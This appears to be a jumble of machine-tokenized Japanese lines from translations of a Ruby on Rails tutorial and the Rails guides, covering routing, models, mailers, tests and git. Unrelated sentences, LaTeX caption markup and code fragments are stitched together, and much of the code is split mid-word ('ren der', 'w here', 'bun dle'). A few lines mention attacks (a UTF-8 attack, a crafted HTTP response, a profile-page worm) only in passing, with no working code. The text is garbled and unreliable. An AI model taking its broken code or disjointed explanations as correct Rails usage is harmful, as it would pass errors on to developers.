したが っ て 、 その ページ の \emph { どこ かしら に } マイクロ ポスト の 投稿 数 が 存在 する の で あ れ ば 、 次 の よう に 探し出 し て マッチ でき る はず で す 。
$  bin/rails   generate  scaffold  user  name  email   login
self を 省略 し た 結果 を リスト \ ref{ code :correct _user_before_filter } に 示 し ま す 。
ファイル アップロード 用 の フィールド を 作成 し ま す 。
*  `config▖ action_dispatch▖http_auth_salt ` は 、 HTTP   Auth の salt 値 ( 訳注 :   ハッシュ の 安全 性 を 強化 する ため に 加え られ る ランダム な 値 ) を 設定 し ま す 。
スクリプト パス 作成 の ため に 内部 で ` javascript_ include_tag ` が 使用 さ れ て い ま す 。
アンカー タグ \ kode { a } に \ kode { href }   ( URL )   属性 を 追加 する こと も でき ま す   ( この 例 で は 、 ユーザー プロファイル へ の リンク ) 。
なお 、 \ ref{ sec : destroying _ users } で は サンプル アプリケーション に ユーザー を 削除 する 機能 を 実装 し 、 管理 権限   ( admin )   を 持 つ ユーザー 以外 は 削除 を 実行 でき な い よう に 制限 を かけ ま す 。
レンダリング の コマンド は Action   Controller で 使用 さ れ て い る もの と 同じ な の で 、 `: text ` 、 `:inline ` など の オプション も すべて 同様 に 使用 でき ま す 。
エンジン 内部 の ルーティング は 、 以下 の よう に ` config/ routes▖rb ` の ` Engine ` クラス に よ っ て 構成 さ れ ま す 。
REST の 原則 に 従 場合 、 リソース へ の 参照 は リソース 名 と ユニーク ID を 使用 する の が 普通 で す 。
    has_many  : paragraphs,  through :  : sections
\ kode { current_user } へ の 要素 代入 を 定義 する 。
  #  You  can   have   the   root   of  your   site   routed  with   " root "
ユーザー に 新し く フォロワー が 増え た とき に メール で 通知 する 機能 を 実装 し て み ま しょ う 。
今後 、 ` respond_ with ` 呼び出 し 、 および クラス レベル の ` respond_to ` 呼び出し は 、 ` responders`   gem なし で は 動作 し ま せ ん 。
フィンガー プリント の 振る舞い に つ い て は ` config ▖ assets▖digest ` 初期 化 オプション で 制御 でき ま す ▟ production モード で は デフォルト で ` true ` 、 それ 以外 で は ` false ` で す 。
単体 テスト および 機能 テスト で 最も 便利 で す 。
以下 の よう に 、 数字 を 特定 の 精度 に 丸め て 文字 列 形式 に でき ま す 。
|   オプション                  | I 18 n   キー                             |
#   Read   more :  https://github▖ com/rails/jbuilder
上 の 例 で 言 う と 、 ` Client ▖ limit ( 10 ) ` と い う コード を 書き直 し て 、 住所 が 一括 で 読み込 ま れ る よう に し ま す 。
つまり 、 ここ で の 実装 は \ kode { has\_ secure\ _ password } と 似 た 側面 を 持 ち ま す 。
ユーザー 登録 フォーム を 完成 さ せ る ため に 、 リスト \ ref{ code : first _create_action } の コメント アウト さ れ た 部分 に コード を 書 き 、 適切 に 動作 する よう に し ま しょ う 。
` prefix ` を 変更 する と 、 Sprockets は development モード で 別 の URL を 使用 し て アセット を 提供 し 、 すべて の リクエスト が Sprockets に 渡 さ れ る よう に な り ま す 。
#  and  use  secure  cookies▖
バージョン が 少々 異な っ て い て も 同じ 結果 を 得 られ る こと も あ り ま す が 、 特に Rails の バージョン に 関 し て は 必ず 指定 を 守 っ て くださ い 。
#   この コード は 慣用 的 な 意味 で 正し く な い 。
*  ` decrement !
フォーク し た リポジトリ を ローカル に クローン し 、 オリジナル の Rails リポジトリ を リモート と し て 追加 する こと も でき ま す ▟ この よう な 場合 は 次 の よう に 行 う 必要 が あ り ま す 。
実際 に 必要 が 生 じ た とき は 「 install  configure  postgresql  < 自分 の システム > 」 や 「 rails   postgresql  setup 」 で ググ って 各自 挑戦 し て み て くださ い
到達 不能   ( unreachable )   で あ っ て も 、 必ず しも 無名   ( anonymous )   に な る と は 限 り ま せ ん 。
\ kode { default _scope } で で マイクロ ポスト を 順序 付け る  
作成 し た About ページ   ( \ href { http://local host : 3000 /static _ pages/about} {/static\_ pages/about } )
###  アセット に リンク する コード を 書 く
CSS クラス は 、 Ruby の クラス と は まったく 関係 が あ り ま せ ん 。
  #   その モジュール の コンテキスト で 実行 さ れ て い る  ( blorgh/concerns/models/article )   は 評価 し な い
` String ` の 拡張
class   Transformer
そして SSL を 有効 化 する の も 簡単 で す ▟  \kode { production ▖rb } と い う 本番 環境 の 設定 ファイル の 1 行 を 修正 する だけ で 済 み ま す 。
オブジェクト が 複製 不 可能 な 場合 、 ` deep_dup ` は 単に その オブジェクト を 返 し ま す 。
  $ bun dle   exec   rake   db : rollback
def  determine_default _mailer ( name )
|`sendmail_settings`|`:sendmail ` の 配信 オプション を 上書き し ま す 。
{ 0 } 図 7 ▖ 3 { / 0 }   { 1 } サンプル アプリケーション の Home ページ に デバッグ 情報 を 表示 する { / 1 }
       create  ▖ gitignore
リクエスト に 応 じ た 制限 は 、 セグメント を 制限 する とき と 同様 の 方法 で 指定 する こと が でき ま す 。
`gsub ! ` の よう な 破壊 的 な 変換 を 行な う メソッド を 使用 する と 、 レシーバ 自体 が 安全 で な く な り ま す 。
         format ▖ json { ren der   json : @user ,  status : : created ,   location : @user   }
2 ▖   ある ユーザー が 別 の ユーザー を フォロー \emph { 解除 } する とき 、 何 が 削除 さ れ る の で しょ う か 。
つまり 、 \ kode {microposts } が 空 に な っ て しま う ため 、 上 の テスト に 何 を 書 い て も 動作 し なく な っ て しま う と い う こと で す 。
レイアウト ファイル は 、 \ kode {rails   new } コマンド を 実行 し て い れ ば 既に 作成 さ れ て い る はず で す 。
  <strong > Title: </strong >
    database :  my_ database
図 \ ref { fig :user_ model_ password_digest } の よう な データ モデル に する ため に 、 まず は \ kode { password_digest } カラム 用 の 適切 な マイグレーション を 生成 し ま す 。
orders▖ create ( attributes = {})
ここ で 、 以下 の よう な 多重 代入   ( Multiple  Assignment )   を 使 っ て い る こと に 注目 し て くださ い 。
|   PATCH / PUT  | /photos/:id       |  photos # update     |  特定 の 写真 を 更新 する                       |
デフォルト は " utf - 8 " で す 。
User モデル に アカウント 有効 化 の コード を 追加 する  
どう に も 気持ち の 悪 い 動作 だ と 思 い ま せ ん か ▟ 私 に も 何故 必要 な の か 分か り ま せ ん 。
|                     |  423                | : locked                          |
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string / filters▖rb ` で す 。
        end
違 う の は 、 `find_ in_batches ` は  _ バッチ _   を 個別 に で は な く モデル の 配列 と し て ブロック に yield する と い う 点 で す 。
これ に よ り 、 フォーム の 送信 が ブラウザ に よ る 通常 の 送信 メカニズム で は な く Ajax に よ っ て 送信 さ れ る よう に な り ま す 。
この テスト は 、 無効 な サイン イン データ を 送信 し 、 次 に Web サイト の レイアウト に あ る Home リンク を 開 き 、 フラッシュ メッセージ が 表示 さ れ て い な い こと を 確認 し ま す 。
これ ら の メソッド は 、 クラス 変数 を ` nil ` に 設定 し   ( クラス 変数 が 既に あ る 場合 を 除 く ) 、 対応 する クラス メソッド を 生成 し て アクセス でき る よう に し ま す 。
Order▖select ( " date ( created_at )   as  ordered_date ,   sum ( price )   as   total_price " ) ▖
ディレクティブ が ` ▖ js` ファイル に 書 か れ て い れ ば 、 Sprockets に よ っ て 自動 的 に ` ▖ js` ファイル が 必要 ファイル と し て 指定 さ れ ま す 。
( 最初 の アプリケーション の とき と 同様 、 GitHub リポジトリ を 初期 化 する とき に \emph { README } を 使用 \ kode { し な い } よう に 注意 し て くださ い ▟ )
NOTE : ` Engine ` クラス の 定義 に 含 ま れ る ` isolate_namespace ` の 行 を 変更 / 削除 し な い こと を   * * 強く * *   推奨 し ま す 。
クラス と ID の 主な 違い は 、 クラス は ページ の 中 で 何 度 で も 使用 でき る の に 対 し 、 ID は 一 度 しか 使用 する こと が でき な い 点 で す 。
上 の テーブル スキーマ に 従 っ て 、 以下 の よう な コード を いきなり 書 く こと が でき ま す 。
$  git  apply ~/ my _ changes ▖ patch
Builder テンプレート は ERB の 代わり に 使用 でき る 、 より プログラミング 向き な 記法 で す 。
残り の ステップ も 同様 に 進め られ ま す 。
  => " development "
#      1 ▖even ?  
     for  item in @ recent_items
この よう な 状況 に 対応 する ため に 、 この エンジン で は ` User ` クラス と の 関連 付け を ハード コード し な い よう に す べ き で す 。
##### `select `
user▖ name  =  'Dave '
{ 0 } 表 1 ▖ 2 :   {/ 0 }   { 1 } デフォルト の Rails フォルダ 構造 まとめ ▟ { / 1 }
( \emph { ヒント : } フォロー し て い る ユーザー が 5000 人 も い た ら どう な る で しょ う か ) 。
テスト 環境 で も Application ヘルパー を 使え る よう に する
1 , 2 ] )         # => true
$  git   checkout  my _pull_request
vendor/assets/somepackage/phonebox ▖ js
SMTP 認証 情報 など の デフォルト の 配信 オプション を メール 配信 時 に 上書き し た い 場合 、 メイラー の アクション で ` delivery _ method_options ` を 使用 し て 変更 する こと が でき ま す 。
$  git   rebase   rails/branch_ name
ただし 、 1 つ 重要 な 違い が あ り ま す ▟ Ruby は シングル クォート 文字 列 の 中 で は 式 展開 を 行 い ま せ ん 。
UTF - 8 に よ る 攻撃 方法 の 例 を 以下 に 示 し ま す 。
config ▖ generators  do  | g |
他 の 静的 ページ に つ い て も 同様 に ルーティング を 変更 し て い く と 、 リスト \ ref{ code :contact _ route } は リスト \ ref{ code :static _ page _ routes } の よう な コード に な り ま す 。
user ▖occupation =  " Code   Artist "
これ まで 通常 の インスタンス 変数 を 使用 し て き た の は 、 インスタンス 変数 を 早 い 段階 で 紹介 し て お き た かっ た の と 、 \ kode {let } が やや 高度 で あ る ため で す 。
この 節 で は 、 RSpec の 最新 の 機能 を 使 い 、 テスト を より 簡潔 で 洗練 さ れ た もの に し ま す 。
デフォルト の " local host " 設定 から 変更 し ま す 。
*   Rails   3 ▖ 2 ▖ x は Ruby   1 ▖ 8 ▖ 7 の 最終 ブランチ で す 。
production 環境 で 実際 に メール 送信 する 方法 に つ い て は \ ref{ sec :email _ in_production } で 説明 し ま す 。
$  git   checkout  my _ new_ branch
[ 1 ,   2 ,   3 ] ▖ in_groups_of ( 2 ,  false )  # =>  [ [ 1 ,   2 ] ,   [ 3 ] ]
###  コンパクト 化
本番 環境 で は 、 ファイル システム で は な く クラウド ストレージ サービス に 画像 を 保存 する よう に し て み ま しょ う
この テスト で は 、 元 の ユーザー が 別 の ユーザー の \ kode {edit } アクション や \ kode {update } アクション に アクセス でき な い こと を 確認 し ま す 。
ユーザー が 有効 で あ る こと を 確認 する 中核 部分 は 以下 の よう に な り ま す 。
Array ▖wrap ( nil )        # => [ ]
|  ** Client   Error * *    |  400                | : bad_request                      |
$ ( "<%=  escape_ javascript ( ren der @user )  %>") ▖ appendTo ( " # users " ) ;
|                     |  501                | : not _implemented                 |
╼╼\ section { セットアップ } %  ( fold) ╼\ label{ sec : sample_app_setup}╼╼ As  in   Chapter ~ \ ref { cha :a_toy_ app },  before   getting   started  we  need to  
3 番 目 に 、 多く の 環境 設定 ファイル を 正し い デフォルト オプション に 更新 し ま す 。
この とき 、 もし タイトル を まったく 与え て い な けれ ば 、 タイトル が 空欄 に な っ て しま い ま す 。
`Users ` コントローラ の ` show ` アクション の 内部 で ` params [ :username ] ` に アクセス する と 、 ユーザー 名 を 取り出 す こと が でき ま す 。
この オプション を 使用 し な い 場合 、 Active   Record は バリデーション ヘルパー の デフォルト の エラー メッセージ を 使用 し ま す 。
     attachments [ 'filename▖ jpg ']  = {
doc/
セッション 用 パス に 有効 な 情報 を post する
assembly_ ids
CD   Baby   創始 者
Rake は いわば \emph { Ruby 版 の make } で あ り 、 Ruby で 記述 する こと の でき る 、 make の よう な 言語 で す 。
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Integration ` の 導入 に 伴 い ` Action Controller : : Integration ` が 非 推奨 と な り ま し た 。
|   GET        | / magazines/: magazine _ id/ads/new      |  ads # new           |  ある 1 冊 の 雑誌 用 の 広告 を 1 つ 作成 する HTML フォーム を 返 す   |
Active   Job は Action   Mailer と 統合 さ れ て い る の で 、 非 同期 メール 送信 を 簡単 に 行え ま す 。
Rails で は こう し た 問題 を 緩和 する ため 、 問題 の 原因 を 自動 的 に 検出 し て 修正 する ため に 内部 で 多く の 手順 を 行 っ て い ま す 。
残念 ながら 、 Ruby や RVM の インストール 中 に 問題 が 生じ る こと が よく あ り ま す 。
   < h 2 ><%=  article ▖title %></ h 2 >
今度 は 順序 を 変え て 計算 する と 、 結果 が 異な り ま す 。
以下 の よう に 、 ヘッダー に 別 の 情報 を 含め る こと も でき ま す 。
delegate  : name ,   : age ,  : address ,  :twitter ,   to : : profile
\ kode {- d } フラグ と 異な り 、 \ kode { - D } フラグ は 変更 を マージ し て い な く て も ブランチ を 削除 し て くれ ま す 。
主な 違い は 、 後者 の \ kode {update_attribute } の 使 い 方 に あ り ま す 。
   scope   : active ,  -> {  w here   active :  true   }
*   [ Ruby   on   Rack   # 1   -   Hello   Rack ! ] (
追加 さ れ る 行数 は そこそこ 多 い の で す が 、 基本 的 に 素直 な の で 心配 は あ り ま せ ん ▟ リスト \ ref{ code : signup_with _account_activation_test } を ご覧 くださ い 。
コメント を コンソール 内 で 入力 する 人 は 普通 い ま せ ん が 、 ここ で は 学習 の ため に あえ て 以下 の よう に コメント を 追加 し て み ま しょ う 。
#   Converts a  collection   of elements into   a   formatted string   by
ここ で は エラー を フラッシュ メッセージ と し て 表示 する の で 、 以下 の よう に テスト でき ま す 。
*  `config▖ action_controller▖ default _static _extension ` は 、 キャッシュ さ れ た ページ に 与え る 拡張 子 を 指定 し ま す 。
YAML から ダンプ し た オブジェクト を 含 む ` pre ` タグ を 返 し ま す 。
# =>  ( 123 )   55 5 - 123 4   x   55 5
{ 0 } 図 7 ▖ 2 { / 0 }   { 1 } 理想 と する 最終 的 な プロファイル ページ の モックアップ { / 1 }
第 3 章 以降 で は 、 いよいよ 本格 的 な 大 規模 \ emph { サンプル アプリケーション }   ( \kode { sample_app }  ) を 開発 し ま す ▟ 自動 生成 コード は 使 わ ず に 、 ゼロ から コード を 書き進め ま す 。
\ kode { paginate } メソッド の 素晴らし さ に 注目 し て くださ い ▟ マイクロ ポスト の 関連 付け を 経由 し て \ texttt {micropost } テーブル に 到達 し 、 必要 な マイクロ ポスト の ページ を 引き出 し て くれ ま す 。
` count ` が それ 以外 の 値 の 場合 は 複数 形 を 返 し ま す ( 訳注 :   英語 で は 個数 が ゼロ や 小数 の 場合 は 複数 形 で 表 さ れ ま す ) 。
<% @ people ▖each   do  | person | %>
MultiJSON は その 役目 を 終え て   [ end - of - life ] (https://github▖ com/rails/rails/pull / 105 76 )   Rails から 削除 さ れ ま し た 。
class   Array
module   My Application
    parts_order : [ " text /plain " ,   " text/enriched " ,   " text /html "   ]
しかし セッション の 内容 は エンド ユーザー から 見え て しま い ま す ▟ 内容 を 暗号 化 する こと で 懸念 を 取り除 く こと が でき 、 パフォーマンス の 低下 も それ ほど あ り ま せ ん 。
従 っ て 、 この メソッド は 、 同じ 場所 で Ruby が 定数 を 評価 し た とき の 値 と 必ず しも 等価 で は あ り ま せ ん 。
m ▖anonymous ?  
Rails で は 以下 の 設定 で この 期間 を 指定 でき ま す 。
上 の 例 の 場合 、 Andy と い う 名前 の クライアント が な かっ た の で レコード を 作成 し て 返 し ま し た 。
       Dir▖ glob ( Rails ▖ root   +  " app/decorators/**/*_decorator * ▖rb " ) ▖each   do  | c|
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string / output_safety▖rb ` で す 。
{ 0 } 図 8 ▖ 2 { / 0 } { 1 } サイン イン 失敗 時 の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/signin_failure_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
mount  Blorgh : : Engine ,   at : "/blog "
Rails に は 標準 で 3 つ 環境 が 備わ っ て お り 、 それぞれ \ kode { 開発 環境   ( development ) } 、 \kode { テスト 環境   ( test ) } 、 \kode { 本番 環境   ( production ) } と 呼 ぶ
統合 テスト で は 、 ルーティング 、 データベース の 更新 、 レイアウト の 変更 が 正し く 行 わ れ て い る か どう か を 確認 でき ま す 。
     login_procedure▖ call ( token ,  options )
`ren der ` と ` redirect_to ` の 違い を 以下 の アクション で 比較 し て み ま しょ う 。
生成 さ れ た HTML ファイル は ▖/ doc/rdoc ディレクトリ に 置 か れ ま す 。
最後 に 、 ユーザー が マイクロ ポスト を Web 経由 で 破棄 でき る よう に し ま す 。
  >> x * =   3
テスト コード は 、 アプリケーション コード から 見 れ ば \emph { クライアント } と し て 動作 する の で 、 アプリケーション の 設計 や システム の 他 の 部分 と の インターフェイス を 決め る とき に も 役 に 立 つ 。
ブラウザ の cookies に トークン を 保存 する とき に は 、 有効 期限 を 設定 する 。
プロフィール 画面 に お け る マイクロ ポスト を テスト する ため に は 、 ユーザー に 紐付 い た マイクロ ポスト の テスト 用 データ が 必要 に な り ま す 。
最終 的 に 4 KB サイズ の ワーム が できあが り 、 作者 は 自分 の プロファイル ページ に これ を 注入 し ま し た 。
たとえば 以下 の よう に 、 cookies に 20 年 後 に 期限 切れ に な る 記憶 トークン に 等し い 値 を 保存 する こと で 、 ユーザー の サイン イン を 実装 でき ま す 。
\ ref{ sec : microposts_resource } で 作成 し た モデル と 同様 に 、 この 新し い Micropost モデル も データ 検証 と User モデル の 関連 付け を 含 ん で い ま す 。
attributes = {}) `
Active   Record は 、 たとえば 関連 付け が 行 わ れ て い る 場合 に 未知 の オプション を 受け付け ま せ ん 。
Client ▖ limit ( 5 )
ファイル に は これ しか 書 か れ て い ま せ ん が 、 この ` Article ` クラス が ` ActiveRecord : : Base ` クラス を 継承 し て い る こと に ご 注目 くださ い 。
##### `prev_quarter ` 、 ` next _ quarter `
    < script   src= " http://html 5shim▖googlecode ▖ com/svn/trunk/html 5 ▖ js" ></ script>
*  `config▖ active_ record ▖ cache_timestamp_ format ` は 、 キャッシュ キー に 含 ま れ る タイム スタンプ 値 の 形式 を 指定 し ま す 。
サード パーティ の プラグ イン や gem で 使用 する CSS   ( Cascading   Style   Sheet ) 、 Java Script ファイル 、 画像 など の アセット
    mattr_accessor  : constant_watch_stack
TIP :   平文 テキスト の 出力 は 、 Ajax や Web サービス リクエスト に 応答 する とき に 最も 有用 で す ▟ これ ら で は HTML 以外 の 応答 を 期待 し て い ま す 。
もし 要素 の 順序 が 重要 で あ る 場合 は 、 配列 を 使用 する 必要 が あ り ま す 。
これ で 、 Heroku アプリ の アドレス 以外 は 図 \ ref { fig : heroku_app } の とおり に 表示 さ れ る はず で す 。
####   コミット を スカッシュ する
{ 0 } 図 9 ▖ 9 { / 0 }   { 1 } ユーザー 一覧 ページ に 100 人 の サンプル ユーザー が 表示 さ れ て い る { / 1 }
タイトル に ERB コード を 使用 し た Help ページ の ビュー
アプリケーション の ルート ・ ディレクトリ で 、 モデル の ジェネレータ を 実行 し ま す 。
これ が ブラウザ に 返 さ れ る HTML に な り ま す 。
この コード は リスト \ ref{ code :user_ model_activation_code } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
#### stylesheet_path
       ActionView:: Base ▖sanitized_allowed_tags▖ delete  'div'
s ▖ add_development_dependency   " moo "
    has _one   : account ,   foreign_key:   " supp_ id "
現 時点 の リクエスト の 負荷 に よ っ て は 、 限 ら れ た 接続 数 を 多数 の スレッド が 奪い合 う よう な こと に な る か も しれ ま せ ん 。
|                     |  30 2                | : found                            |
これ で サンプル ユーザー に 、 フォロー し て い る ユーザー と フォロワー が でき ま し た ▟ ユーザー プロファイル ページ と Home ページ を 更新 し て これ を 反映 し ま しょ う 。
rake   db : migrate  SCOPE = blorgh   VERSION = 0
{ 0 } 図 4 ▖ 1 { / 0 }   { 1 } \ kode { String } クラス の 継承 階層 { / 1 }
    FileETag   None
   belongs_to  : customer ,  -> {  w here   active :  true   } ,
*   単一行 ブロック は スペース 無し の 「 ` method { do _stuff }` 」 より も スペース あり の 「 ` method  {  do _stuff  }` 」 が 望まし い 。
\ href { http://local host : 3000 / sessions/new}{/sessions/new } フォーム を 送信 する と 図 \ ref { fig: initial _failed_ login_rails _ 3 } の よう に な り ま す 。
スコープ を スコープ 内 で 連鎖   ( chain )   さ せ る こと も でき ま す 。
オブジェクト を 保存 し よ う と する と 、 関連 付け られ て い る オブジェクト ごと に ` valid ? ` が 呼び出 さ れ ま す 。
検証 の 詳細 に つ い て は [ Active   Record   バリデーション ] ( active_ record_ validations ▖html ) を 参照 し て くださ い 。
      @ person ▖errors [ : base ]  <<  " これ は 悪人 だ "  
  $ < エディタ 名 >  ▖
Author ▖ w here ( name :  'Hank  Moody') ▖ compact !
         format ▖ json { ren der   json : @user ▖errors ,  status : :unprocessable_entity   }
{ 0 } 図 7 ▖ 22 { / 0 } { 1 } 本番 Web で 動作 中 の ユーザー 登録 ページ ▟   \ href { http://railstutorial ▖org / images/figures/signup_ in_production_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
#   指定 さ れ た 日時   ( ここ で は 本日 から 4 日 後 )   を デフォルト 値 と する 日時 セレクト ボックス を 生成 する
タイトル で 埋め込 み Ruby を 使用 し た Help ページ の ビュー
` prev _week ` も 同様 で す 。
assemblies<< (object ,  ▖▖▖)
images       javascripts stylesheets
` params [ : id ] ` に は ` " 1 " ` 、 ` params [ :user_ id ] ` に は ` " 2 " ` が それぞれ 保存 さ れ ま す 。
Git リポジトリ を ビジュアル 表示 する に は 、 Atlassian の \ href { http://www ▖sourcetree app▖ com/}{ SourceTree アプリケーション } が 便利 で す 。
      article   GET     /articles/: id ( ▖: format )        articles # show
そして 解決 策 が 明確 に な っ た 段階 で 、 テスト 駆動 開発 で コード を 清書 する と い う 方法 も あ り え ま す 。
論理 属性 \ kode { admin } を 追加 する と 、 自動 的 に \ kode {user ▖ admin ? } メソッド が 使え る よう に な る
Active   Support   コア 拡張 機能
#     < sha 1 > 723 a 47 bfb 370 8 f 968821 bc 969 a 9 a 3 fc 873 a 3 ed 58 < / sha 1 >
リスト \ ref{ code : password _ resets_ integration_test } の コード を 使用 する と 、 テスト コード は   \ passing   に な る はず で す 。
テスト スイート を 実行 し て 確認 する こと も でき ま す ▟ この テスト は パス する はず で す 。
今後 の 学習 の 手始め と する ため に 、 この 節 で は 、 より 踏み込 ん だ 学習 を する ため の 方法 を 紹介 し ま す 。
\ kode { form\_ for } の 引数 に 上 の オプション が 追加 さ れ て い る こと に 注目 し て くださ い ▟ これ は ファイル を アップロード する 際 に 必要 と な る オプション で す 。
この 動作 は 統合 テスト で 自然 に 行 わ れ ま す   ( リスト \ ref{ code : password _ reset_integration_test } )   が 、 この テスト で は パスワード 再 設定 用 トークン を 手動 で 作成 する 必要 が あ り ま す 。
    <%=   f ▖ submit   %>
{ 0 } 図 2 ▖ 8 { / 0 } { 1 } 情報 が 更新 さ れ た ユーザー ▟ \ href { http://railstutorial ▖org / images/figures/demo_update_user_rails _ 3 - full ▖ png } { ( 拡大 ) } { / 1 }
$  curl  - i   12 7 ▖ 0 ▖ 0 ▖ 1 : 3000 / books
    redirect_to   action : :index
    if   expiration_date▖ present ?  
     params ▖ require(:comment ) ▖ permit(:text )
作成 し た コード を リスト \ ref{ code :user_edit_ specs } に 示 し ま す
{ 0 } リスト 2 ▖ 13 { / 0 } ╼╼ { 1 } \ kode {User } クラス に おけ る 継承 { 3 } { / 3 }   { 4 } app/models/user▖ rb { / 4 } { / 1 }
\ kode {bun dle   exec } を 省略 する こと が でき ま し た 。
Rails   3 ▖ 0 以前 の バージョン で は 、 静的 ファイル は \ kode { public /} 以下 の 次 の ディレクトリ に 置 か れ て い ま し た 。
###  記事 を 表示 する
/tmp
###  到達 可能
#### `instance_ values`
この Java Script コード を 実行 する と 、 警告 ボックス が 1 つ 表示 さ れ る だけ で す 。
たとえば 、 供給 者 ( supplier ) 1人 に つ き アカウント ( account ) を 1 つ だけ 持 つ と い う 関係 が あ る の で あ れ ば 、 以下 の よう に 宣言 を 行 い ま す 。
また 、 リスト \ ref{ code : generate_user_ model } で は モデル 用 の user▖ rb も 作 ら れ ま し た 。
残念 で す が 、 上 の コード は Ruby の 配列 の 妙 に よ り 動 き ま せ ん 。
サイン イン に 成功 し た とき の テスト 。
duplicate # =>  [ ' foo' ]
これ は リスト \ ref{ code :preventing _unactivated_ logins } で 使用 さ れ て い ま し た 。
モデル を 呼び出 し た 後 、 コントローラ は 、 ビュー を レンダリング し 、 完成 し た Web ページ を HTML と し て ブラウザ に 返 し ま す 。
Rails だけ で しか 使え な い 基礎 的 な 知識 に 基づ く の で は な く 、
<% = stylesheet_link_tag   "main " ,   " photos/ columns "  %>
$ bun dle   exec   rake   test ╼ $  git   add   - A╼$  git  commit   - m   " Add  password   resets & email   configuration " ╼ $  git   checkout   master ╼ $  git   merge  account - activation - password - reset
WARN :  ` reverse _update ` に は 破壊 的 な バージョン は あ り ま せ ん 。
マイクロ ポスト 作成 の テスト 。
*   Rails   4 ▖ 0 で は ` ActiveModel : : Validations : : ConfirmationValidator ` に エラー が アタッチ さ れ る 方法 が 変更 さ れ ま し た 。
この To   get  this   to   work ,  we  need to   define   the  \ kode { password\_ reset\_expired ? }
User モデル が できあが っ た の で 、 いよいよ Web サイト に な く て は な ら な い ユーザー 登録 機能 を 追加 し ま しょ う 。
フォーム ヘルパー を 使用 する と 、 標準 の HTML 要素 だけ を 使用 する より も はるか に 容易 に 、 モデル と 連携 動作 する フォーム を 作成 する こと が でき ま す 。
     config▖ session_store   : my _ custom_store
サイン イン し た ユーザー は 、 もはや Users コントローラ の \ kode {new } アクション や   \ kode { create } アクション に アクセス する 必要 は あ り ま せ ん 。
レンダリング 中 の ビュー 内 に 置 か れ て い る 上 の コード は 、 その 場所 で ` _menu▖html ▖erb ` と い う 名前 の ファイル を レンダリング し ま す 。
続 い て GitHub に プッシュ し て も 構 い ま せ ん 。
   validates : registration_number ,   length : {  is :   6   }
SQL の ` NOT ` クエリ は 、 ` w here ▖ not ` で 表せ ま す 。
ファイル サイズ を jQuery で チェック する
  < input   name =" commit "  type = " submit "   value = " Create "  />
*   バリデーション プロセス で 生成 さ れ た エラー メッセージ の 取り扱い
ren der status :   500
読者 から の フィードバック を 読 ん だ 限り で は 、 その よう な 方 で あ っ て も 本書 から 多く の こと を 学べ る はず だ と 自信 を 持 っ て 言え ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/string / strip▖rb ` で す 。
    < h 1 ><%= @user▖ name  % > 様 、 example ▖ com へ よ う こそ ▟ </ h 1 >
( ほとんど の プログラマー は ネイティブ の ri や rdoc など 参照 せ ず 、 さっさと オン ライン ドキュメント を 見 に 行 っ て しま い ま す ) 。
config▖ action _mailer▖ default _options  = { from : 'no - reply@ example ▖ com'}
Active   Record の バリデーション を 使 う と 、 モデル に 対 し て 制限 を 追加 する こと が でき る
従 っ て 、 特定 の 読み込 み 順 に 依存 し な い よう に する 必要 が あ り ま す 。
= >   Rails   application   starting   on   http://0 ▖ 0 ▖ 0 ▖ 0 : 300 0
Heroku 上 で 動 い て い る 最初 の Rails チュートリアル アプリケーション 。
次 に 以下 の コマンド を 実行 し ま す 。
  <div >< input type = " submit "   value = " An   article " ></div>
* `load_environment_hook ` :   これ は プレース ホルダ と し て 使用 さ れ ま す ▟ 具体 的 に は 、 `:load_environment_config ` を 定義 し て この イニシャライザ より 前 に 実行 し た い 場合 に 使用 し ま す 。
失敗 する テスト を 一時 的 に コメント アウト する  
デフォルト は ` false ` で あ り 、 この 場合 は Test : :Unit が 使用 さ れ ま す 。
本 ガイド で は 、 バック グラウンド で 実行 する ジョブ の 作成 や キュー 登録   ( エンキュー :   enqueue )   、 実行 方法 に つ い て 解説 し ま す 。
It   worked !
作成 し た コード を リスト \ ref{ code : route_tests } に 示 し ま す
*  `config▖ mid dleware ` は 、 アプリケーション で 使用 する ミドルウェア を カスタマイズ でき ま す 。
<%  cache  do  %>
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/introspection ▖rb ` 。
*   メソッド 名
上 の コード は 常 に \ kode {nil } に な っ て しま い ま す 。
*  `application_controller▖ rb `
make_microposts
    get  '/' => 'root # index'
╼╼%=  lang : rhtml╼\ begin{ code }
既に \ ref{ sec : github } で 一 度 プッシュ を 行 っ た の で 、 大抵 の システム で は \ kode { git   push } を 実行 する とき に \ kode {origin  master } を 省略 でき ま す 。
*   モデル の クラス   -   単数 形 で あ り 、 語頭 を 大 文字 に する   ( 例 : ` Book Club ` )
ただし 、 どう い う わけ か この 場合 \ kode {xhr } メソッド を 結合 テスト で 使用 する こと が でき な い ため に 、 この コントローラ で の テスト を 行な っ て い ま す 。
キー は 文字 列 で す 。
     config▖ active_ job▖queue_name_prefix   =   Rails ▖env
  <tr >
` require_directory ` ディレクティブ を 使用 する と 、 指定 さ れ た ディレクトリ の 直下 に あ る すべて の Java Script ファイル のみ を インク ルード し ま す ▟ この 場合 サブ ディレクトリ を 再帰 的 に 探索 し ま せ ん 。
  >>  Rails ▖env
HTTP / 1 ▖ 1   200   OK   [ ここ より 下 は 攻撃 者 に よ っ て 作成 さ れ た 次 の 新し い レスポンス ]
同じ コントローラ で 、 デフォルト と 異な る テンプレート に 対応 する ビュー を 出力 し た い 場合 は 、 ` ren der ` メソッド で ビュー 名 を 指定 する こと が でき ま す 。
以下 の メソッド は バリデーション を 行 わ ず に スキップ し ま す ▟ オブジェクト の 保存 は 、 有効 無効 に かかわ ら ず 行 わ れ ま す 。
お 手軽 すぎ る Scaffold の 甘 い 誘惑
個別 の cookies は 、 ひと つ の \ kode { value }   ( 値 )   と 、 オプション の \ kode {expires }  ( 有効 期限 )   から でき て い ま す ▟ 有効 期限 は 省略 可能 で す 。
ドキュメント ルート ・ ディレクトリ から の 完全 な パス が 返 さ れ ま す 。
さて 、 テキスト の 配置 は 今 ひと つ で 、 ロゴ に は スタイル も あ り ま せ ん が 、 色使い と signup ボタン は なかなか よ い 感じ に な っ て き ま し た 。
     mime_ version :   " 1 ▖ 0 " ,
